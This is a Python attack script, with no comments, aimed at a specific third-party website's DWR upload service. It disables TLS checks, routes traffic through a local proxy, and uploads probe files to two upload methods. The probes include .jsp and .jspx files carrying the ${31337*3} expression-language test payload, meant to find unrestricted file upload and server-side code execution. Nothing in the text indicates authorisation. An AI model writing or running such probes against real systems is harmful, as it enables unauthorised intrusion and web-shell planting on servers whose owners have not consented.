import sys, ssl, uuid, urllib.request, time
ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
opener=urllib.request.build_opener(urllib.request.ProxyHandler({'http':'http://127.0.0.1:7897','https':'http://127.0.0.1:7897'}), urllib.request.HTTPSHandler(context=ctx))
def call(method, params, file_idx, filename, content):
    b='----DWR'+uuid.uuid4().hex
    out=bytearray()
    def field(n,v): out.extend((f'--{b}\r\nContent-Disposition: form-data; name="{n}"\r\n\r\n{v}\r\n').encode())
    field('callCount','1'); field('page','/dwr/test/dwrUploadService'); field('httpSessionId',''); field('scriptSessionId',''); field('batchId','0'); field('instanceId','0')
    field('c0-scriptName','dwrUploadService'); field('c0-methodName',method); field('c0-id','0')
    for i,p in enumerate(params):
        if i==file_idx: continue
        field(f'c0-param{i}',p)
    out.extend((f'--{b}\r\nContent-Disposition: form-data; name="c0-param{file_idx}"; filename="{filename}"\r\nContent-Type: application/octet-stream\r\n\r\n').encode())
    out.extend(content); out.extend(b'\r\n'); out.extend(f'--{b}--\r\n'.encode())
    req=urllib.request.Request(f'https://m.boxkj.com/dwr/call/plaincall/dwrUploadService.{method}.dwr', data=bytes(out), method='POST')
    req.add_header('Content-Type', f'multipart/form-data; boundary={b}')
    try:
        with opener.open(req,timeout=25) as r:
            txt=r.read(2000).decode('utf-8','replace')
            import re
            m=re.search(r'handleCallback\("0","0",(.{0,300})\)',txt,re.S)
            print(f'[{method} {filename}] OK {m.group(1) if m else txt[:200]}')
    except Exception as e:
        print(f'[{method} {filename}] ERR {type(e).__name__}: {e}')
tests=[
 ('uploadFile',['probe_a.txt','',''],1,'probe_a.txt',b'HELLO'),
 ('uploadFile',['probe_b.jsp','',''],1,'probe_b.jsp',b'HELLO'),
 ('uploadFile',['probe_c.jsp','','resources/teacherApk'],1,'probe_c.jsp',b'${31337*3}'),
 ('uploadApkToDesDir',['probe_d.jsp',''],1,'probe_d.jsp',b'HELLO'),
 ('uploadApkToDesDir',['probe_e.jspx',''],1,'probe_e.jspx',b'${31337*3}'),
]
for t in tests:
    call(*t); time.sleep(1.5)
